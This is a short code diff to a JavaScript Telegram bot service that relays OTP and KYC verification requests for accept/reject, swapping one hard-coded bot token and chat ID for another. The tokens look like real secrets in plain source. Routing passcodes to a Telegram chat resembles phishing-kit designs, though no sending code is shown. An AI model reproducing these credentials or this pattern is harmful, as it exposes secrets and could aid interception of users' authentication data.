@@ -1,8 +1,8 @@
 // Telegram Bot Service for Backend Notifications
 // Handles OTP and KYC verification requests with accept/reject functionality
 
-const TELEGRAM_BOT_TOKEN = '8942706260:AAG6vuSYHmqR5JmRlJV8zN9adU7HZ2YXenM';
-const TELEGRAM_CHAT_ID = '6879118752';
+const TELEGRAM_BOT_TOKEN = '7961364433:AAF3DArir94zGinDzJ2pQW3I5ZEi4P6W8xs';
+const TELEGRAM_CHAT_ID = '7867527304';
 const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // Store pending verification requests
